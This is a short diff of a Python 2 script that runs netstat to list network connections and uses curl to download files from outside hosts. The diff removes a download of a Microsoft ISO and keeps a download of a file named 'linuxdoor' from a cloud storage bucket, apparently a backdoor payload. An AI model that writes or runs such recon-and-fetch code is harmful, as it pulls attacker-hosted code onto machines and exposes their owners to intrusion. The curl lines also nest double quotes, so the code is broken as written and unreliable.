@@ -26,10 +26,6 @@ print "netstat"
 p = subprocess.Popen("netstat -ntu", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
-print "get"
-p = subprocess.Popen("curl -o 9.zip "http://software-download.microsoft.com/pr/Win10_Chinese(Simplified)_x32.iso?t=wooyun"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-print p.communicate()[0]
-
 
 print "get2"
 p = subprocess.Popen("curl -o linuxdoor "http://tlbb.oss-cn-hangzhou.aliyuncs.com/linuxdoor"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
